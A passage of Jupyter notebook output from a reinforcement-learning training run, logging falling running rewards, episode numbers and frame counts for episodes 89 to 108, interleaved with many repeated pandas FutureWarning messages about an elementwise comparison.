      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2035.85\t Episode 89\t Frame count: 189767\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2125.30\t Episode 90\t Frame count: 192375\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2125.30\t Episode 90\t Frame count: 193247\t Context: 2\n",
      "Running reward: -2134.80\t Episode 91\t Frame count: 193711\t Context: 2\n",
      "Running reward: -2134.80\t Episode 91\t Frame count: 194758\t Context: 2\n",
      "Running reward: -2127.80\t Episode 92\t Frame count: 197130\t Context: 2\n",
      "Running reward: -2127.80\t Episode 92\t Frame count: 199581\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2156.96\t Episode 93\t Frame count: 201908\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2156.96\t Episode 93\t Frame count: 205298\t Context: 2\n",
      "Running reward: -2195.10\t Episode 94\t Frame count: 207307\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2195.10\t Episode 94\t Frame count: 210654\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2228.59\t Episode 95\t Frame count: 219483\t Context: 2\n",
      "Running reward: -2310.36\t Episode 96\t Frame count: 220916\t Context: 2\n",
      "Running reward: -2310.36\t Episode 96\t Frame count: 221430\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2294.25\t Episode 97\t Frame count: 224633\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2294.25\t Episode 97\t Frame count: 227737\t Context: 2\n",
      "Running reward: -2335.48\t Episode 98\t Frame count: 227823\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2335.48\t Episode 98\t Frame count: 230775\t Context: 2\n",
      "Running reward: -2342.52\t Episode 99\t Frame count: 232191\t Context: 2\n",
      "Running reward: -2342.52\t Episode 99\t Frame count: 233795\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2349.23\t Episode 100\t Frame count: 238951\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2425.71\t Episode 101\t Frame count: 248699\t Context: 2\n",
      "Running reward: -2425.71\t Episode 101\t Frame count: 249262\t Context: 2\n",
      "Running reward: -2479.52\t Episode 102\t Frame count: 249409\t Context: 2\n",
      "Running reward: -2479.52\t Episode 102\t Frame count: 253150\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2505.95\t Episode 103\t Frame count: 256424\t Context: 2\n",
      "Running reward: -2505.95\t Episode 103\t Frame count: 256939\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2543.00\t Episode 104\t Frame count: 263104\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2543.00\t Episode 104\t Frame count: 266270\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2629.96\t Episode 105\t Frame count: 268295\t Context: 2\n",
      "Running reward: -2629.96\t Episode 105\t Frame count: 268706\t Context: 2\n",
      "Running reward: -2653.10\t Episode 106\t Frame count: 269236\t Context: 2\n",
      "Running reward: -2653.10\t Episode 106\t Frame count: 269784\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2660.62\t Episode 107\t Frame count: 272001\t Context: 2\n",
      "Running reward: -2660.62\t Episode 107\t Frame count: 272574\t Context: 2\n",
      "Running reward: -2680.32\t Episode 108\t Frame count: 273938\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2680.32\t Episode 108\t Frame count: 275991\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
